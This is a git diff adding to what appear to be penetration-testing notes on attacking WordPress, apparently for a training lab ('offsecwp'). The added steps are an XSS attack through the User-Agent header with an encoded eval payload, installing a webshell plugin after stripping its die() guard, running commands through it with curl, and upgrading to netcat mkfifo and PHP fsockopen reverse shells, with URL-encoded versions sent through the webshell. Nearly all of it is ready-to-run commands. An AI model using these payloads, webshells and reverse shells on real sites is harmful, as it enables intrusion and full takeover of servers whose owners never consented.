@@ -19,9 +19,13 @@
 User-Agent: <script>alert(42)</script>
 ```
 
+Login to WP verify XSS
+
+`http://target.wordpress.com/wp-login.php`
+
 ## Privilege Escalation by XSS on WP Instance
 
-Source: 
+Source:
 
 * Exploit `https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/`
 * JS Encoding `https://eve.gd/2007/05/23/string-fromcharcode-encoder/`
@@ -48,7 +52,7 @@ ajaxRequest.send(params);
 
 First, the JavaScript Payload has to be minified into a oneliner and encoded. We can use `https://jscompress.com` or `https://javascript-minifier.com`.
 
-Next, the JS Encoding function converts every char into UTF-16 integer using `charCodeAt` and concate it with a comma. e.g. 118,97,... 
+Next, the JS Encoding function converts every char into UTF-16 integer using `charCodeAt` and concate it with a comma. e.g. 118,97,...
 
 Alternatively we can use a handy online JS Encoding service `https://eve.gd/2007/05/23/string-fromcharcode-encoder/` that does the job. Or we can use an online URL encoding service `https://www.url-encode-decode.com/`.
 
@@ -69,5 +73,60 @@ let encoded = encode_to_javascript('insert_minified_javascript_here')
 console.log(encoded)
 ```
 
-
 Finally, we can decode the integers on-demand in the script tag using `String.fromCharCode` and execute the script with `eval`.
+
+```bash
+curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,53,48,39,41,59))</script>" --proxy 127.0.0.1:8080
+```
+
+## Inplant Web shell on WP Instance
+
+* Webshell WP-Plugin `https://github.com/p0dalirius/Wordpress-webshell-plugin/blob/master/README.md`
+* Login as Admin
+* Navigate to Plugins
+* Select "Add New" or
+* Select "Plugin Editor"
+* Select "Activate" Webshell
+
+Download Webshell from Github and install it. Go to Plugin Editor remove the illigal `die()` from the plugin and update it. Activate the plugin to deploy Webshell. Then run a Webshell test with the shell commend `id`.  
+
+```bash
+curl -X POST 'target.net/wordpress/wp-content/plugins/wp_webshell/wp_webshell.php' --data "action=exec&cmd=id"
+```
+
+## Upgrade to Reverse shell on WP Instance
+
+* Get Reverse Shell e.g. nc + bash
+* URL Encoding `https://www.url-encode-decode.com/`
+* Start nc listener
+* Run shell command to upgrade to reverse shell
+
+NC Reverse Shell
+
+```bash
+nc -nvlp PORT
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc IP PORT > /tmp/f
+```
+
+PHP Reverse Shell
+
+```php
+php -r '$sock=fsockopen("IP",PORT);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+```
+
+Spawn Reverse Shell
+
+```bash
+# NC
+curl -X POST 'offsecwp/wordpress/wp-content/plugins/wp_webshell/wp_webshell.php' --data "action=exec&cmd=rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff+%7C+%2Fbin%2Fsh+-i+2%3E%261+%7C+nc+IP+PORT+%3E+%2Ftmp%2Ff"
+# PHP
+curl -X POST 'offsecwp/wordpress/wp-content/plugins/wp_webshell/wp_webshell.php' --data "action=exec&cmd=php%20-r%20%27%24sock%3Dfsockopen(%22IP%22%2CPORT)%3B%24proc%3Dproc_open(%22%2Fbin%2Fsh%20-i%22%2C%20array(0%3D%3E%24sock%2C%201%3D%3E%24sock%2C%202%3D%3E%24sock)%2C%24pipes)%3B%27
+```
+
+Upgrade to Bash
+
+```bash
+listening on [any] PORT ...
+connect to [IP] 
+bash -i
+```
